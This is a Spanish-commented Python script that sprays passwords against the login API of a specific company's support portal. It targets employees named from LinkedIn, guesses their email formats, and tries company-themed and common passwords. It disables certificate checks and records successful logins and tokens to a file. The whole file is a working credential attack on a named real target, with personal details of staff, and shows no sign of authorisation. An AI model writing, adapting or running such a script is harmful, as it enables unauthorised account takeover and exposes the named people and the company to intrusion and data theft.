#!/usr/bin/env python3
"""
Disperso — soporte.disperso.com spray
- POST /api/auth/login {"email":"...","password":"..."}
- Sin captcha server-side, sin rate limit, sin lockout
- Respuesta: 401 + {"message":"Credenciales invalidas"} para creds malas
            200 + JWT para creds válidas
"""
import sys, json, time, requests, itertools
from datetime import datetime

requests.packages.urllib3.disable_warnings()

BASE = "https://soporte.disperso.com"
LOGIN_URL = f"{BASE}/api/auth/login"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Origin": "https://soporte.disperso.com",
    "Referer": "https://soporte.disperso.com/login",
}

# ── NOMBRES CONFIRMADOS LinkedIn ──────────────────────────────────────────────
NAMES = [
    ("patricia",   "erazo"),        # Gerente General
    ("sandra",     "ulloa"),        # Gerente Comercial
    ("daniela",    "canales"),      # Lead qualifier
    ("santiago",   "macias"),       # Team (linkedin mention)
    ("cristian",   "lourido"),      # Team
    ("carlos",     "duran"),        # Team
    ("francisco",  "coca"),         # Team (Francisco J. Coca H.)
    ("monica",     "rojas"),        # Team
    ("rodrigo",    "panes"),        # Backend dev TUXPAN/Disperso
    ("esteban",    "conejeros"),    # Software Architect TUXPAN
    ("francisco",  "pallauta"),     # Software Engineer TUXPAN
    ("admin",      ""),             # Genéricos
    ("soporte",    ""),
    ("info",       ""),
    ("it",         ""),
    ("dev",        ""),
    ("test",       ""),
]

# Patterns de email chilenos frecuentes:
# 1. nombre.apellido@
# 2. nombre@
# 3. napellido@ (inicial + apellido)
# 4. nombreapellido@
def gen_emails(first, last, domain="disperso.com"):
    emails = []
    f = first.lower().replace("ó","o").replace("ú","u").replace("á","a").replace("é","e").replace("í","i").replace("ñ","n")
    l = last.lower().replace("ó","o").replace("ú","u").replace("á","a").replace("é","e").replace("í","i").replace("ñ","n")
    if f and l:
        emails += [
            f"{f}.{l}@{domain}",
            f"{f}{l}@{domain}",
            f"{f[0]}.{l}@{domain}",
            f"{f[0]}{l}@{domain}",
            f"{f}@{domain}",
            f"{f}.{l}@tuxpan.cl",   # también probamos tuxpan
        ]
    elif f:
        emails += [
            f"{f}@{domain}",
            f"{f}@{domain}".replace(f"{f}@", "admin@"),
        ]
    return list(dict.fromkeys(emails))  # dedup

EMAILS = []
for first, last in NAMES:
    EMAILS.extend(gen_emails(first, last))

# Añadir email sales@ conocido
EMAILS.append("sales@disperso.com")

# ── PASSWORDS ─────────────────────────────────────────────────────────────────
PASSWORDS = [
    # Específicas empresa
    "Disperso2024!",
    "Disperso2025!",
    "Disperso2026!",
    "Tuxpan2024!",
    "Tuxpan2025!",
    "Tuxpan2026!",
    "disperso2024",
    "disperso2025",
    "disperso123",
    # Comunes fintech Chile
    "Admin123!",
    "Admin1234!",
    "Password1!",
    "Password123!",
    "Soporte123!",
    "Chile2024!",
    "Chile2025!",
    "Pagos2024!",
    "Pagos2025!",
    "Masivos2024!",
    # Simples
    "123456",
    "admin123",
    "admin",
    "soporte",
    "123456789",
    "Qwerty123!",
    # Apellido + año (patrón común Chile)
    "Erazo2024!",
    "Erazo2025!",
    "Ulloa2024!",
    "Ulloa2025!",
]

RESULTS = []
HIT_FOUND = False


def try_login(email, password):
    global HIT_FOUND
    try:
        body = json.dumps({"email": email, "password": password})
        r = requests.post(LOGIN_URL, data=body, headers=HEADERS,
                          verify=False, timeout=10, allow_redirects=False)
        ts = datetime.utcnow().isoformat()

        if r.status_code == 200:
            HIT_FOUND = True
            entry = {"ts": ts, "email": email, "password": password,
                     "status": r.status_code, "body": r.text[:500]}
            RESULTS.append(entry)
            print(f"\n🔥🔥🔥 HIT [{r.status_code}] {email}:{password}")
            print(f"  BODY: {r.text[:300]}")
            # Guardar inmediatamente
            with open("soporte_spray_results.json", "w") as f:
                json.dump(RESULTS, f, indent=2, ensure_ascii=False)
            return True

        elif r.status_code == 400:
            # Validación de campo (email malformado)
            print(f"  [400] {email}:{password} → {r.text[:80]}")

        # 401 = creds malas (esperado para todos los intentos fallidos)
        return False

    except Exception as e:
        print(f"  [ERR] {email}:{password} → {e}")
        return False


def main():
    print(f"Target: {LOGIN_URL}")
    print(f"Emails a probar: {len(EMAILS)}")
    print(f"Passwords: {len(PASSWORDS)}")
    total = len(EMAILS) * len(PASSWORDS)
    print(f"Total intentos: {total}")
    print("=" * 60)

    count = 0
    for email in EMAILS:
        for pw in PASSWORDS:
            count += 1
            hit = try_login(email, pw)
            pct = count * 100 // total
            if count % 10 == 0:
                print(f"  [{pct}%] {count}/{total} — último: {email}")
            time.sleep(0.3)  # 300ms cooldown (seguro)
            if HIT_FOUND and hit:
                pass  # continuar aunque encontremos un hit

    print("\n" + "=" * 60)
    print(f"DONE. {len(RESULTS)} hits.")
    if RESULTS:
        for r in RESULTS:
            print(f"  ✅ {r['email']}:{r['password']}")

    with open("soporte_spray_results.json", "w") as f:
        json.dump(RESULTS, f, indent=2, ensure_ascii=False)
    print("Resultados: soporte_spray_results.json")


if __name__ == "__main__":
    main()
